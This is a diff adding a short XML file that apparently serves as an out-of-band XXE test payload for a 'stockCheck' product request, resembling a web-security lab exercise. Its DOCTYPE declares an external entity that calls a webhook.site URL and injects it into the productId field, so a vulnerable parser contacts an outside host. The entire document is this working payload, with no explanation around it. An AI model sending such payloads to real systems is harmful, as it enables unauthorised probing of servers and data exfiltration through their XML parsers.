@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "https://webhook.site/a476903b-dc93-4201-a850-b53672f73ef2/xmlgithub"> ]>
+<stockCheck>
+<productId>&xxe;</productId>
+<storeId>1</storeId>
+</stockCheck>
